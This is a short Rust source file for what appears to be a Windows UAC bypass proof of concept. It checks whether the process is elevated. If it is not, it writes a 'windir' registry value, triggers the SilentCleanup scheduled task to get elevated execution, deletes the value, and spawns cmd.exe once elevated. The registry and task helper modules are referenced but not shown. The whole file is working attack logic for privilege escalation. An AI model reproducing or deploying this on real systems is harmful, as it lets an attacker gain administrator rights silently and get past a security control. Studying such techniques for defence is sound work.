use std::process::Command;

pub mod is_elevated;
pub mod registry;
pub mod schtasks;

fn main() {
  // Check the elevation
  if !is_elevated::is_elevated() {
    elevate();
  } else {
    Command::new("cmd.exe").spawn().unwrap();
  }
}

fn elevate() {
  println!("[+] Elevating...");
  // Add the "windir" registry key
  registry::set_windir();

  // Run the SilentCleanup task
  schtasks::run_silent_cleanup_task();

  // Delete the "windir" registry key
  registry::delete_windir();
}
